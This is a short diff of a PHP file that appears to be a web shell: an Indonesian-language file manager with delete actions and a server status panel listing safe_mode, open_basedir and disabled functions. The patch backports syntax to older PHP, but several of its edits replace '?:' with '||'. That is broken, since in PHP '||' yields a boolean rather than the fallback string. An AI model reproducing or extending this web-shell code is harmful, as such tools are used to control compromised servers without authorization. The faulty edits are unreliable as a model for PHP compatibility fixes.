@@ -310,7 +310,7 @@ if (isset($_GET['delete_path']) && $_GET['delete_path'] !== '') {
                 $msg = 'File berhasil dihapus: ' . h(basename($real));
             } else {
                 $e = error_get_last();
-                $msg = 'Gagal hapus file: ' . h(basename($real)) . ' — ' . h($e['message'] ?? 'unknown');
+                $msg = 'Gagal hapus file: ' . h(basename($real)) . ' — ' . h(isset($e['message']) ? $e['message'] : 'unknown');
             }
         } elseif (is_dir($real)) {
             if (delete_directory($real)) {
@@ -1100,10 +1100,10 @@ pre{white-space:pre-wrap;word-wrap:break-word;overflow:auto;}
         Disk: <span style="color:#7ee787;" id="stat-disk"><?php echo h(format_size($disk_free)); ?></span>
             / <span id="stat-disk-total"><?php echo h(format_size($disk_total)); ?></span>
             <span id="stat-disk-pct" style="color:#8e99ab;">(-)</span> free<br>
-        safe_mode: <span style="color:<?php echo $safe_mode ? '#ff7b72' : '#7ee787'; ?>;"><?php echo h($safe_mode ?: 'off'); ?></span> |
-        open_basedir: <span style="color:<?php echo $open_basedir ? '#ff7b72' : '#7ee787'; ?>;"><?php echo h($open_basedir ?: 'off'); ?></span><br>
+        safe_mode: <span style="color:<?php echo $safe_mode ? '#ff7b72' : '#7ee787'; ?>;"><?php echo h($safe_mode || 'off'); ?></span> |
+        open_basedir: <span style="color:<?php echo $open_basedir ? '#ff7b72' : '#7ee787'; ?>;"><?php echo h($open_basedir || 'off'); ?></span><br>
         TimeZone: <?php echo h($timezone); ?><br>
-        Disabled: <span style="color:#ff7b72; word-wrap:break-word;"><?php echo h($disabled ?: 'none'); ?></span><br>
+        Disabled: <span style="color:#ff7b72; word-wrap:break-word;"><?php echo h($disabled || 'none'); ?></span><br>
         Path: <span class="path"><?php echo breadcrumb_path($cwd_real); ?></span>
         <a href="?"><strong>[ HOME ]</strong></a> ~|~
         <a href="?logout=1" style="color:#ff7b72;"><strong>[ Logout ]</strong></a>
